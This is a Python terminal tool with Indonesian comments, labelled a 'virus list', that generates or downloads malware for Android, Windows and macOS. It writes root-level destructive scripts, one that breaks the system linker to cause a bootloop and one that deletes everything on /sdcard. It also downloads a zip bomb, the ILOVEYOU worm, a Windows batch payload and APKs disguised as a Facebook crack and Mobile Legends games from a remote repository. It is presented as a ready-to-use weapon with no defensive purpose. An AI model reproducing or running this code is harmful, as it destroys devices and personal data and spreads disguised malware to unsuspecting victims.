import os
import sys
import time
import urllib.request
import json

# Warna ANSI
R = '\x1b[1;31m'  # Merah
Y = '\x1b[1;33m'  # Kuning
G = '\x1b[1;32m'  # Hijau
C = '\x1b[1;36m'  # Cyan
W = '\x1b[1;37m'  # Putih
B = '\x1b[1;34m'  # Biru
N = '\x1b[0m'     # Reset Warna

# Fungsi untuk restart program
def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

# Banner utama
def banner():
    print(f'{C}╔════════════════════════════════════════════════════════════════╗{N}')
    print(f'{C}║{R} ██▓███   █    ██  ███▄    █  ███▄    █  ██████  █    ██{C}         ║{N}')
    print(f'{C}║{R}▓██░  ██▒ ██  ▓██▒ ██ ▀█   █  ██ ▀█   █▒██    ▒  ██  ▓██▒{C}       ║{N}')
    print(f'{C}║{R}▓██░ ██▓▒▓██  ▒██░▓██  ▀█ ██▒▓██  ▀█ ██░ ▓██▄   ▓██  ▒██░{C}       ║{N}')
    print(f'{C}║{R}▒██▄█▓▒ ▒▓▓█  ░██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒ ▒   ██▒▓▓█  ░██░{C}       ║{N}')
    print(f'{C}║{R}▒██▒ ░  ░▒▒█████▓ ▒██░   ▓██░▒██░   ▓██░██████▒▒▒▒█████▓ {C}       ║{N}')
    print(f'{C}║{R}▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░▒▒▓▒ ▒ ▒ {C}      ║{N}')
    print(f'{C}║{R}░▒ ░     ░░▒░ ░ ░ ░ ░░   ░ ▒░░ ░░   ░ ▒░░ ░▒  ░ ░░░▒░ ░ ░ {C}      ║{N}')
    print(f'{C}║{R}░░        ░░░ ░ ░    ░   ░ ░    ░   ░ ░ ░  ░  ░   ░░░ ░ ░ {C}      ║{N}')
    print(f'{C}║{R}             ░              ░          ░        ░     ░     {C}      ║{N}')
    print(f'{C}╚════════════════════════════════════════════════════════════════╝{N}')

# Bersihkan layar terminal
clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

# Fungsi untuk membaca data JSON
def load_virus_data():
    return {
        "anvima": [
		{
			"name": "Bootloop",
			"type": "code",
			"output": "bootloop.sh",
			"content": "su -c 'rename /system/bin/linker /system/bin/link_lunk'\n"
		},
		{
			"name": "Data-Eater",
			"type": "code",
			"output": "data-eater.sh",
			"content": "su -c rm -rf /sdcard/*\n"
		},
		{
			"name": "Freeze",
			"type": "url",
			"output": "freeze.sh",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/freeze.sh"
		},
		{
			"name": "Bomb-Zip",
			"type": "url",
			"output": "zipbomb.zip",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/42.zip"
		},
		{
			"name": "Elite",
			"type": "url",
			"output": "elite.apk",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/elite.apk"
		},
		{
			"name": "Trash",
			"type": "url",
			"output": "trash.sh",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/trash.sh"
		},
		{
			"name": "FBCrack 2K18",
			"type": "url",
			"output": "FBCR2K18.apk",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/fbcr.apk"
		},
		{
			"name": "Vi4a",
			"type": "url",
			"output": "vi4a.apk",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/vi4a.apk"
		},
		{
			"name": "Malum",
			"type": "url",
			"output": "Malum.apk",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/Malum.apk"
		},
		{
			"name": "TakeBeer",
			"type": "url",
			"output": "TakeBeer.apk",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/TakeBeer.apk"
		},
		{
			"name": "Mobile Legends: Adventure",
			"type": "url",
			"output": "Mobile_Legends_Adventure.apk",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk"
		},
		{
			"name": "Mobelejen",
			"type": "url",
			"output": "mobelejen.apk",
			"content": "https://github.com/Gameye98/V1RU5/raw/master/mobelejen.apk"
		}
        ],
        "winvima": [
            {"name": "R.I.P", "type": "url", "output": "RIP.bat", "content": "https://github.com/Gameye98/V1RU5/raw/master/RIP.bat"},
            {"name": "ILOVEYOU", "type": "url", "output": "ILOVEYOU.vbs", "content": "https://github.com/Gameye98/V1RU5/raw/master/ILOVEYOU.vbs"}
        ],
        "macvima": [
            {"name": "Trinoids", "type": "url", "output": "trinoids.app", "content": "https://github.com/Gameye98/V1RU5/raw/master/trinoids.app"}
        ]
    }

# Fungsi untuk menampilkan daftar virus
def show_virus_list(platform, data):
    print(f'{C}╔══════════════════════════════════════════════╗{N}')
    print(f'{C}║{B} Virus List for {platform}                  {C}║{N}')
    print(f'{C}╚══════════════════════════════════════════════╝{N}')
    for index, virus in enumerate(data, start=1):
        print(f'{C}[{Y}{index}{C}] {G}{virus["name"]}{N}')
    print(f'\n{C}[{Y}0{C}] Back to Main Menu{N}\n')

# Fungsi untuk menangani pilihan virus
def handle_virus_choice(platform, data):
    try:
        choice = int(input(f'{C}BUNNYSAD {Y}> Choose virus:{N} '))
        if choice == 0:
            return
        elif 1 <= choice <= len(data):
            virus = data[choice - 1]
            print(f'{C}[{Y}+{C}] Processing {virus["name"]}...{N}')
            if virus["type"] == "code":
                with open(virus["output"], "w") as file:
                    file.write(virus["content"])
                print(f'{C}[{Y}+{C}] File created: {virus["output"]}{N}')
            elif virus["type"] == "url":
                print(f'{C}[{Y}+{C}] Downloading: {virus["content"]}{N}')
                urllib.request.urlretrieve(virus["content"], virus["output"])
                print(f'{C}[{Y}+{C}] File downloaded: {virus["output"]}{N}')
        else:
            print(f'{C}[{R}!{C}] Invalid choice. Try again.{N}')
    except Exception as e:
        print(f'{C}[{R}!{C}] Error: {e}{N}')

# Menu utama
def main():
    virus_data = load_virus_data()
    while True:
        clear()
        banner()
        print(f'{C}╔════════════════════════════════════════════════╗{N}')
        print(f'{C}║{B} [1] Show Android Virus List                  {C}║{N}')
        print(f'{C}║{B} [2] Show Windows Virus List                  {C}║{N}')
        print(f'{C}║{B} [3] Show macOS Virus List                    {C}║{N}')
        print(f'{C}║{R} [0] Exit                                    {C}║{N}')
        print(f'{C}╚════════════════════════════════════════════════╝{N}')
        try:
            choice = int(input(f'{C}BUNNYSAD {Y}> Enter your choice:{N} '))
            if choice == 1:
                show_virus_list("Android", virus_data["anvima"])
                handle_virus_choice("Android", virus_data["anvima"])
            elif choice == 2:
                show_virus_list("Windows", virus_data["winvima"])
                handle_virus_choice("Windows", virus_data["winvima"])
            elif choice == 3:
                show_virus_list("macOS", virus_data["macvima"])
                handle_virus_choice("macOS", virus_data["macvima"])
            elif choice == 0:
                print(f'{Y}[{R}+{Y}] Exiting...{N}')
                break
            else:
                print(f'{C}[{R}!{C}] Invalid choice. Try again.{N}')
                time.sleep(2)
        except ValueError:
            print(f'{C}[{R}!{C}] Invalid input. Please enter a number.{N}')
            time.sleep(2)

# Jalankan program
if __name__ == "__main__":
    main()